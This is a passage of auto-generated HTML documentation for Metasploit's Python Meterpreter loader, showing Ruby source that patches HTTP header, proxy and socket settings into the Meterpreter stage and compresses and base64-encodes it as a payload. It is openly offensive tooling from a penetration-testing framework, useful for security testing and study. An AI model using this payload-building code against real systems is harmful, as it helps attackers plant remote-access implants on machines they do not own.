    <span class='id identifier rubyid_met'>met</span><span class='period'>.</span><span class='id identifier rubyid_sub!'>sub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HTTP_HOST = None</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>HTTP_HOST = &#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_escape'>var_escape</span><span class='period'>.</span><span class='id identifier rubyid_call'>call</span><span class='lparen'>(</span><span class='id identifier rubyid_http_header_host'>http_header_host</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span> <span class='kw'>if</span> <span class='id identifier rubyid_http_header_host'>http_header_host</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>!=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
    <span class='id identifier rubyid_met'>met</span><span class='period'>.</span><span class='id identifier rubyid_sub!'>sub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HTTP_REFERER = None</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>HTTP_REFERER = &#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_escape'>var_escape</span><span class='period'>.</span><span class='id identifier rubyid_call'>call</span><span class='lparen'>(</span><span class='id identifier rubyid_http_header_referer'>http_header_referer</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span> <span class='kw'>if</span> <span class='id identifier rubyid_http_header_referer'>http_header_referer</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>!=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>

    <span class='kw'>if</span> <span class='id identifier rubyid_http_proxy_host'>http_proxy_host</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>!=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
      <span class='id identifier rubyid_http_proxy_url'>http_proxy_url</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>http://</span><span class='tstring_end'>&quot;</span></span>
      <span class='kw'>unless</span> <span class='id identifier rubyid_http_proxy_user'>http_proxy_user</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span> <span class='op'>&amp;&amp;</span> <span class='id identifier rubyid_http_proxy_pass'>http_proxy_pass</span><span class='period'>.</span><span class='id identifier rubyid_to_s'>to_s</span> <span class='op'>==</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
        <span class='id identifier rubyid_http_proxy_url'>http_proxy_url</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_uri_encode'>uri_encode</span><span class='lparen'>(</span><span class='id identifier rubyid_http_proxy_user'>http_proxy_user</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>:</span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_uri_encode'>uri_encode</span><span class='lparen'>(</span><span class='id identifier rubyid_http_proxy_pass'>http_proxy_pass</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>@</span><span class='tstring_end'>&quot;</span></span>
      <span class='kw'>end</span>
      <span class='id identifier rubyid_http_proxy_url'>http_proxy_url</span> <span class='op'>&lt;&lt;</span> <span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Socket</span><span class='period'>.</span><span class='id identifier rubyid_is_ipv6?'>is_ipv6?</span><span class='lparen'>(</span><span class='id identifier rubyid_http_proxy_host'>http_proxy_host</span><span class='rparen'>)</span> <span class='op'>?</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>[</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_http_proxy_host'>http_proxy_host</span><span class='embexpr_end'>}</span><span class='tstring_content'>]</span><span class='tstring_end'>&quot;</span></span> <span class='op'>:</span> <span class='id identifier rubyid_http_proxy_host'>http_proxy_host</span><span class='rparen'>)</span>
      <span class='id identifier rubyid_http_proxy_url'>http_proxy_url</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>:</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_http_proxy_port'>http_proxy_port</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>

      <span class='id identifier rubyid_met'>met</span><span class='period'>.</span><span class='id identifier rubyid_sub!'>sub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>HTTP_PROXY = None</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>HTTP_PROXY = &#39;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_var_escape'>var_escape</span><span class='period'>.</span><span class='id identifier rubyid_call'>call</span><span class='lparen'>(</span><span class='id identifier rubyid_http_proxy_url'>http_proxy_url</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>&#39;</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
    <span class='kw'>end</span>
  <span class='kw'>end</span>

  <span class='comment'># patch in any optional stageless tcp socket setup
</span>  <span class='kw'>unless</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:stageless_tcp_socket_setup</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
    <span class='id identifier rubyid_offset_string'>offset_string</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_end'>&quot;</span></span>
    <span class='tstring'><span class='regexp_beg'>/</span><span class='tstring_content'>(?&lt;offset_string&gt;\s+)# PATCH-SETUP-STAGELESS-TCP-SOCKET #</span><span class='regexp_end'>/</span></span> <span class='op'>=~</span> <span class='id identifier rubyid_met'>met</span>
    <span class='id identifier rubyid_socket_setup'>socket_setup</span> <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:stageless_tcp_socket_setup</span><span class='rbracket'>]</span>
    <span class='id identifier rubyid_socket_setup'>socket_setup</span> <span class='op'>=</span> <span class='id identifier rubyid_socket_setup'>socket_setup</span><span class='period'>.</span><span class='id identifier rubyid_split'>split</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span>
    <span class='id identifier rubyid_socket_setup'>socket_setup</span><span class='period'>.</span><span class='id identifier rubyid_map!'>map!</span> <span class='lbrace'>{</span><span class='op'>|</span><span class='id identifier rubyid_line'>line</span><span class='op'>|</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_offset_string'>offset_string</span><span class='embexpr_end'>}</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_line'>line</span><span class='embexpr_end'>}</span><span class='tstring_content'>\n</span><span class='tstring_end'>&quot;</span></span><span class='rbrace'>}</span>
    <span class='id identifier rubyid_socket_setup'>socket_setup</span> <span class='op'>=</span> <span class='id identifier rubyid_socket_setup'>socket_setup</span><span class='period'>.</span><span class='id identifier rubyid_join'>join</span>
    <span class='id identifier rubyid_met'>met</span><span class='period'>.</span><span class='id identifier rubyid_sub!'>sub!</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_offset_string'>offset_string</span><span class='embexpr_end'>}</span><span class='tstring_content'># PATCH-SETUP-STAGELESS-TCP-SOCKET #</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='id identifier rubyid_socket_setup'>socket_setup</span><span class='rparen'>)</span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_met'>met</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="stage_payload-instance_method">
  
    #<strong>stage_payload</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
  

  

  
</h3><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


46
47
48</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/python/meterpreter_loader.rb', line 46</span>

<span class='kw'>def</span> <span class='id identifier rubyid_stage_payload'>stage_payload</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
  <span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_encode_base64'>encode_base64</span><span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_zlib_deflate'>zlib_deflate</span><span class='lparen'>(</span><span class='id identifier rubyid_stage_meterpreter'>stage_meterpreter</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span><span class='rparen'>)</span><span class='rparen'>)</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
  </div>

</div>

      <div id="footer">
  Generated on Thu Oct 27 00:00:34 2022 by
  <a href="https://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
  0.9.28 (ruby-2.7.2).
</div>

    </div>
  </body>
</html>